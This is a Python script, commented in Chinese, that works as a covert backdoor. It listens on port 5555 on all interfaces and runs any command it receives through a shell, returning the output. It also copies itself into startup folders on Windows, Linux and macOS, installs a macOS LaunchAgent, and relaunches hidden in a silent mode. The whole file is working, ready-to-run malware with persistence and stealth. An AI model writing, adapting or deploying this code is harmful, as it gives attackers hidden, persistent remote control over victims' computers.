####CMD方面
import os
import platform
import socket
import subprocess
import threading
import sys
import shutil



def handle_client(client_socket):
    """隐蔽处理客户端连接"""
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8').strip()
            if not command:
                break

            if command.lower() == 'exit':
                client_socket.send(b'Connection closed')
                break

            if command.lower().startswith(('chcp', 'encoding')):
                client_socket.send("此命令禁止在远程执行".encode('utf-8'))
                continue

            try:
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT
                )
            except subprocess.CalledProcessError as e:
                output = e.output

            client_socket.send(output)

        except Exception:
            break

    client_socket.close()


def get_startup_dir():
    """获取开机自启动目录"""
    if platform.system() == "Windows":
        return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif platform.system() == "Linux":
        return os.path.expanduser('~/.config/autostart')
    elif platform.system() == "Darwin":  # macOS
        return os.path.expanduser('~/Library/LaunchAgents')
    else:
        return None


def copy_to_startup():
    """复制自身到开机启动目录并返回新路径"""
    try:
        script_path = os.path.abspath(__file__)
        script_name = os.path.basename(script_path)
        startup_dir = get_startup_dir()

        if not startup_dir:
            return None

        os.makedirs(startup_dir, exist_ok=True)
        target_path = os.path.join(startup_dir, script_name)

        # 如果目标已存在且内容相同，则跳过
        if os.path.exists(target_path):
            with open(script_path, 'rb') as f1, open(target_path, 'rb') as f2:
                if f1.read() == f2.read():
                    return target_path

        shutil.copy2(script_path, target_path)

        # macOS需要特殊处理
        if platform.system() == "Darwin":
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.{script_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            plist_path = os.path.join(startup_dir, f'com.user.{script_name}.plist')
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            os.system(f'launchctl load {plist_path}')

        return target_path
    except Exception as e:
        print(f"复制到启动目录失败: {e}")
        return None


def start_new_instance(script_path):
    """启动新实例并返回进程对象"""
    try:
        if platform.system() == "Windows":
            # Windows下使用CREATE_NO_WINDOW标志隐藏窗口
            return subprocess.Popen(
                [sys.executable, script_path, '-silent'],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Linux/macOS下使用nohup后台运行
            return subprocess.Popen(
                [sys.executable, script_path, '-silent'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
    except Exception as e:
        print(f"启动新实例失败: {e}")
        return None


def start_server(host='0.0.0.0', port=5555):
    """启动隐蔽服务器"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)

    # 静默模式不显示任何信息
    if len(sys.argv) > 1 and sys.argv[1] == '-silent':
        pass
    else:
        print(f"Server started on {host}:{port}")

    while True:
        try:
            client_socket, addr = server.accept()
            threading.Thread(
                target=handle_client,
                args=(client_socket,),
                daemon=True
            ).start()
        except KeyboardInterrupt:
            break
        except Exception:
            continue

    server.close()


if __name__ == "__main__":
    # 如果不是静默模式，且不在启动目录中运行，则复制并启动新实例
    if len(sys.argv) <= 1 or sys.argv[1] != '-silent':
        startup_script = copy_to_startup()
        if startup_script and os.path.abspath(__file__) != os.path.abspath(startup_script):
            new_process = start_new_instance(startup_script)
            if new_process:
                print(f"已启动新实例: {startup_script}")
                sys.exit(0)  # 退出原进程

    # 运行服务器
    start_server()
    # screen_server.main()